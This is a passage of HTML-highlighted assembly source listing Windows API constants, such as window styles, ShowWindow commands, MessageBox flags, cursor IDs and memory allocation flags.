</span><span class="sc5">WM_COALESCE_FIRST</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0390h</span><span class="sc0">
</span><span class="sc5">WM_COALESCE_LAST</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">039Fh</span><span class="sc0">

</span><span class="sc1">;  private window messages start here</span><span class="sc0">
</span><span class="sc5">WM_USER</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0400H</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">           </span><span class="sc1">; NOWM</span><span class="sc0">

</span><span class="sc1">; WM_MOUSEACTIVATE Return Codes</span><span class="sc0">
</span><span class="sc5">MA_ACTIVATE</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">MA_ACTIVATEANDEAT</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">MA_NOACTIVATE</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0">

</span><span class="sc1">; Size message commands</span><span class="sc0">
</span><span class="sc5">SIZENORMAL</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SIZEICONIC</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">SIZEFULLSCREEN</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">SIZEZOOMSHOW</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">SIZEZOOMHIDE</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc1">; ShowWindow() Commands</span><span class="sc0">
</span><span class="sc5">SW_HIDE</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SW_SHOWNORMAL</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">SW_NORMAL</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">SW_SHOWMINIMIZED</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">SW_SHOWMAXIMIZED</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">SW_MAXIMIZE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">SW_SHOWNOACTIVATE</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">SW_SHOW</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">SW_MINIMIZE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">SW_SHOWMINNOACTIVE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">SW_SHOWNA</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">SW_RESTORE</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">

</span><span class="sc1">; Old ShowWindow() Commands</span><span class="sc0">
</span><span class="sc5">HIDE_WINDOW</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SHOW_OPENWINDOW</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">SHOW_ICONWINDOW</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">SHOW_FULLSCREEN</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">SHOW_OPENNOACTIVATE</span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc1">;  identifiers for the WM_SHOWWINDOW message</span><span class="sc0">
</span><span class="sc5">SW_PARENTCLOSING</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">SW_OTHERZOOM</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">SW_PARENTOPENING</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">SW_OTHERUNZOOM</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Key state masks for mouse messages</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">MK_LBUTTON</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0001h</span><span class="sc0">
</span><span class="sc5">MK_RBUTTON</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0002h</span><span class="sc0">
</span><span class="sc5">MK_SHIFT</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0004h</span><span class="sc0">
</span><span class="sc5">MK_CONTROL</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0008h</span><span class="sc0">
</span><span class="sc5">MK_MBUTTON</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0010h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Class styles</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CS_VREDRAW</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0001h</span><span class="sc0">
</span><span class="sc5">CS_HREDRAW</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0002h</span><span class="sc0">
</span><span class="sc5">CS_KEYCVTWINDOW</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0004H</span><span class="sc0">
</span><span class="sc5">CS_DBLCLKS</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0008h</span><span class="sc0">
</span><span class="sc1">;                    0010h reserved</span><span class="sc0">
</span><span class="sc5">CS_OWNDC</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0020h</span><span class="sc0">
</span><span class="sc5">CS_CLASSDC</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0040h</span><span class="sc0">
</span><span class="sc5">CS_PARENTDC</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0080h</span><span class="sc0">
</span><span class="sc5">CS_NOKEYCVT</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0100h</span><span class="sc0">
</span><span class="sc5">CS_SAVEBITS</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0800h</span><span class="sc0">
</span><span class="sc5">CS_NOCLOSE</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0200h</span><span class="sc0">
</span><span class="sc5">CS_BYTEALIGNCLIENT</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc5">CS_BYTEALIGNWINDOW</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">2000h</span><span class="sc0">
</span><span class="sc5">CS_GLOBALCLASS</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">    </span><span class="sc1">; Global window class</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Special CreateWindow position value</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CW_USEDEFAULT</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">    </span><span class="sc2">8000h</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Windows styles</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">WS_OVERLAPPED</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000000000h</span><span class="sc0">
</span><span class="sc5">WS_ICONICPOPUP</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">
</span><span class="sc5">WS_POPUP</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">080000000h</span><span class="sc0">
</span><span class="sc5">WS_CHILD</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">040000000h</span><span class="sc0">
</span><span class="sc5">WS_MINIMIZE</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">020000000h</span><span class="sc0">
</span><span class="sc5">WS_VISIBLE</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">010000000h</span><span class="sc0">
</span><span class="sc5">WS_DISABLED</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">008000000h</span><span class="sc0">
</span><span class="sc5">WS_CLIPSIBLINGS</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">004000000h</span><span class="sc0">
</span><span class="sc5">WS_CLIPCHILDREN</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">002000000h</span><span class="sc0">
</span><span class="sc5">WS_MAXIMIZE</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">001000000h</span><span class="sc0">
</span><span class="sc5">WS_CAPTION</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000C00000h</span><span class="sc0">     </span><span class="sc1">; WS_BORDER | WS_DLGFRAME</span><span class="sc0">
</span><span class="sc5">WS_BORDER</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000800000h</span><span class="sc0">
</span><span class="sc5">WS_DLGFRAME</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000400000h</span><span class="sc0">
</span><span class="sc5">WS_VSCROLL</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000200000h</span><span class="sc0">
</span><span class="sc5">WS_HSCROLL</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000100000h</span><span class="sc0">
</span><span class="sc5">WS_SYSMENU</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000080000h</span><span class="sc0">
</span><span class="sc5">WS_THICKFRAME</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000040000h</span><span class="sc0">
</span><span class="sc5">WS_HREDRAW</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000020000h</span><span class="sc0">
</span><span class="sc5">WS_VREDRAW</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000010000h</span><span class="sc0">
</span><span class="sc5">WS_GROUP</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000020000h</span><span class="sc0">
</span><span class="sc5">WS_TABSTOP</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000010000h</span><span class="sc0">
</span><span class="sc5">WS_MINIMIZEBOX</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000020000h</span><span class="sc0">
</span><span class="sc5">WS_MAXIMIZEBOX</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">000010000h</span><span class="sc0">

</span><span class="sc1">; Common Window Styles</span><span class="sc0">

</span><span class="sc5">WS_OVERLAPPEDWINDOW</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">WS_OVERLAPPED</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">WS_CAPTION</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">WS_SYSMENU</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">WS_THICKFRAME</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">WS_MINIMIZEBOX</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">WS_MAXIMIZEBOX</span><span class="sc0">
</span><span class="sc5">WS_POPUPWINDOW</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">WS_POPUP</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">WS_BORDER</span><span class="sc0"> </span><span class="sc6">OR</span><span class="sc0"> </span><span class="sc5">WS_SYSMENU</span><span class="sc0">
</span><span class="sc5">WS_CHILDWINDOW</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">WS_CHILD</span><span class="sc0">
</span><span class="sc5">WS_TILEDWINDOW</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">WS_OVERLAPPEDWINDOW</span><span class="sc0">

</span><span class="sc5">WS_TILED</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">WS_OVERLAPPED</span><span class="sc0">
</span><span class="sc5">WS_ICONIC</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">WS_MINIMIZE</span><span class="sc0">
</span><span class="sc5">WS_SIZEBOX</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">WS_THICKFRAME</span><span class="sc0">

</span><span class="sc1">; Extended Window Styles (low words)</span><span class="sc0">
</span><span class="sc5">WS_EX_DLGMODALFRAME</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0001</span><span class="sc0">
</span><span class="sc5">WS_EX_DRAGOBJECT</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0002</span><span class="sc0">
</span><span class="sc5">WS_EX_NOPARENTNOTIFY</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0004</span><span class="sc0">
</span><span class="sc5">WS_EX_TOPMOST</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0008</span><span class="sc0">


</span><span class="sc1">; PeekMessage() Options</span><span class="sc0">
</span><span class="sc5">PM_NOREMOVE</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">PM_REMOVE</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0001h</span><span class="sc0">
</span><span class="sc5">PM_NOYIELD</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0002h</span><span class="sc0">

</span><span class="sc1">; SetWindowPos Flags</span><span class="sc0">
</span><span class="sc5">SWP_NOSIZE</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0001h</span><span class="sc0">
</span><span class="sc5">SWP_NOMOVE</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0002h</span><span class="sc0">
</span><span class="sc5">SWP_NOZORDER</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0004h</span><span class="sc0">
</span><span class="sc5">SWP_NOREDRAW</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0008h</span><span class="sc0">
</span><span class="sc5">SWP_NOACTIVATE</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0010h</span><span class="sc0">
</span><span class="sc5">SWP_DRAWFRAME</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0020h</span><span class="sc0">
</span><span class="sc5">SWP_SHOWWINDOW</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0040h</span><span class="sc0">
</span><span class="sc5">SWP_HIDEWINDOW</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0080h</span><span class="sc0">
</span><span class="sc5">SWP_NOCOPYBITS</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0100h</span><span class="sc0">
</span><span class="sc5">SWP_NOREPOSITION</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">0200h</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Predefined cursor &amp; icon IDs</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IDC_ARROW</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">32512</span><span class="sc0">
</span><span class="sc5">IDC_IBEAM</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">32513</span><span class="sc0">
</span><span class="sc5">IDC_WAIT</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">32514</span><span class="sc0">
</span><span class="sc5">IDC_CROSS</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">32515</span><span class="sc0">
</span><span class="sc5">IDC_UPARROW</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">32516</span><span class="sc0">
</span><span class="sc5">IDC_SIZE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">32640</span><span class="sc0">
</span><span class="sc5">IDC_ICON</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">32641</span><span class="sc0">
</span><span class="sc5">IDC_SIZENWSE</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">32642</span><span class="sc0">
</span><span class="sc5">IDC_SIZENESW</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">32643</span><span class="sc0">
</span><span class="sc5">IDC_SIZEWE</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">32644</span><span class="sc0">
</span><span class="sc5">IDC_SIZENS</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">32645</span><span class="sc0">

</span><span class="sc5">IDI_APPLICATION</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">32512</span><span class="sc0">
</span><span class="sc5">IDI_HAND</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">32513</span><span class="sc0">
</span><span class="sc5">IDI_QUESTION</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">32514</span><span class="sc0">
</span><span class="sc5">IDI_EXCLAMATION</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">32515</span><span class="sc0">
</span><span class="sc5">IDI_ASTERISK</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">32516</span><span class="sc0">

</span><span class="sc5">COLOR_SCROLLBAR</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">COLOR_BACKGROUND</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">COLOR_ACTIVECAPTION</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">COLOR_INACTIVECAPTION</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">COLOR_MENU</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">COLOR_WINDOW</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">COLOR_WINDOWFRAME</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">COLOR_MENUTEXT</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">COLOR_WINDOWTEXT</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">COLOR_CAPTIONTEXT</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">9</span><span class="sc0">
</span><span class="sc5">COLOR_ACTIVEBORDER</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
</span><span class="sc5">COLOR_INACTIVEBORDER</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">
</span><span class="sc5">COLOR_APPWORKSPACE</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">12</span><span class="sc0">
</span><span class="sc5">COLOR_HIGHLIGHT</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc0">
</span><span class="sc5">COLOR_HIGHLIGHTTEXT</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">14</span><span class="sc0">
</span><span class="sc5">COLOR_BTNFACE</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
</span><span class="sc5">COLOR_BTNSHADOW</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc5">COLOR_GRAYTEXT</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">
</span><span class="sc5">COLOR_BTNTEXT</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">18</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  MessageBox type flags</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">MB_OK</span><span class="sc0">                   </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0000H</span><span class="sc0">
</span><span class="sc5">MB_OKCANCEL</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0001H</span><span class="sc0">
</span><span class="sc5">MB_ABORTRETRYIGNORE</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0002H</span><span class="sc0">
</span><span class="sc5">MB_YESNOCANCEL</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0003H</span><span class="sc0">
</span><span class="sc5">MB_YESNO</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0004H</span><span class="sc0">
</span><span class="sc5">MB_RETRYCANCEL</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0005H</span><span class="sc0">

</span><span class="sc5">MB_ICONHAND</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0010H</span><span class="sc0">
</span><span class="sc5">MB_ICONQUESTION</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0020H</span><span class="sc0">
</span><span class="sc5">MB_ICONEXCLAMATION</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0030H</span><span class="sc0">
</span><span class="sc5">MB_ICONASTERISK</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0040H</span><span class="sc0">

</span><span class="sc5">MB_DEFBUTTON1</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0000H</span><span class="sc0">
</span><span class="sc5">MB_DEFBUTTON2</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0100H</span><span class="sc0">
</span><span class="sc5">MB_DEFBUTTON3</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0200H</span><span class="sc0">

</span><span class="sc5">MB_APPLMODAL</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0000H</span><span class="sc0">
</span><span class="sc5">MB_SYSTEMMODAL</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1000H</span><span class="sc0">
</span><span class="sc5">MB_TASKMODAL</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">2000H</span><span class="sc0">

</span><span class="sc5">MB_NOFOCUS</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">8000H</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Conventional dialog box and message box command IDs</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">IDOK</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">IDCANCEL</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">IDABORT</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">IDRETRY</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">IDIGNORE</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">IDYES</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">IDNO</span><span class="sc0">     </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">7</span><span class="sc0">

</span><span class="sc5">FILE_BEGIN</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">FILE_CURRENT</span><span class="sc0">    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">FILE_END</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">

</span><span class="sc5">SHARE_READ</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000000001h</span><span class="sc0">
</span><span class="sc5">SHARE_WRITE</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000000002h</span><span class="sc0">
</span><span class="sc5">MAX_PATH</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">260</span><span class="sc0">

</span><span class="sc5">CREATE_NEW</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">CREATE_ALWAYS</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">OPEN_EXISTING</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">OPEN_ALWAYS</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">TRUNCATE_EXISTING</span><span class="sc0">   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">5</span><span class="sc0">

</span><span class="sc5">GMEM_FIXED</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000000000h</span><span class="sc0">
</span><span class="sc5">GMEM_MOVEABLE</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000000002h</span><span class="sc0">
</span><span class="sc5">GMEM_NOCOMPACT</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000000010h</span><span class="sc0">
</span><span class="sc5">GMEM_NODISCARD</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000000020h</span><span class="sc0">
</span><span class="sc5">GMEM_ZEROINIT</span><span class="sc0">       </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000000040h</span><span class="sc0">
</span><span class="sc5">GMEM_MODIFY</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000000080h</span><span class="sc0">
</span><span class="sc5">GMEM_DISCARDABLE</span><span class="sc0">        </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">000000100h</span><span class="sc0">
